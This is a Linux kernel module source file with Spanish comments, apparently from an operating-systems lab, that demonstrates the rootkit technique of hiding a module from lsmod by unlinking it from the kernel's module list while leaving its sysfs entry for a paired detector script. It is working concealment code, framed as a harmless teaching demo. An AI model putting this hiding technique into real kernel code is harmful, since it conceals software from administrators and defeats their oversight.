// SPDX-License-Identifier: GPL-2.0
/*
 * ocultar_demo - Demostracion de ocultamiento de un modulo de lsmod
 *
 * PROPOSITO: es el "lado ataque" del par ataque/defensa. Muestra la tecnica
 * clasica de rootkit para desaparecer de `lsmod`: desenlazarse de la lista
 * global de modulos (THIS_MODULE->list). Esto es lo que recorre /proc/modules.
 *
 * DELIBERADAMENTE INOFENSIVO:
 *   - No hace NADA mas que esconderse de la lista.
 *   - No captura datos, no da privilegios, no persiste, no re-engancha nada.
 *   - Grita por dmesg lo que hace.
 *   - Deja intacta su entrada en /sys/module  <-- asi el detector lo caza.
 *
 * El punto educativo: ocultarse de /proc/modules NO alcanza, porque sysfs
 * sigue mostrando el modulo. El detector (detector.sh) explota exactamente
 * esa inconsistencia.
 *
 * ⚠️ Una vez oculto, `rmmod ocultar_demo` por nombre FALLA (ya no esta en la
 *    lista). Para limpiar: REINICIA la VM descartable. Es a proposito, para
 *    que se vea la limitacion real de la tecnica.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lab SO - uso educativo");
MODULE_DESCRIPTION("Demo de ocultamiento de modulo (par con detector.sh)");
MODULE_VERSION("1.0");

static int __init ocultar_init(void)
{
	pr_alert("ocultar_demo: ===== CARGADO. Me voy a OCULTAR de lsmod =====\n");
	pr_alert("ocultar_demo: tecnica = list_del(THIS_MODULE->list)\n");

	/*
	 * Nos sacamos de la lista doblemente enlazada de modulos. Despues de
	 * esto no aparecemos en /proc/modules (ni en `lsmod`), pero SI seguimos
	 * en /sys/module/ocultar_demo porque no tocamos el kobject.
	 */
	list_del(&THIS_MODULE->list);

	pr_alert("ocultar_demo: listo. 'lsmod | grep ocultar_demo' ya no me muestra.\n");
	pr_alert("ocultar_demo: pero 'ls /sys/module/ | grep ocultar_demo' SI.\n");
	pr_alert("ocultar_demo: corre detector.sh para cazarme. Reinicia la VM para limpiar.\n");
	return 0;
}

static void __exit ocultar_exit(void)
{
	/* En la practica no se llega aca por rmmod normal estando oculto. */
	pr_alert("ocultar_demo: descargado.\n");
}

module_init(ocultar_init);
module_exit(ocultar_exit);
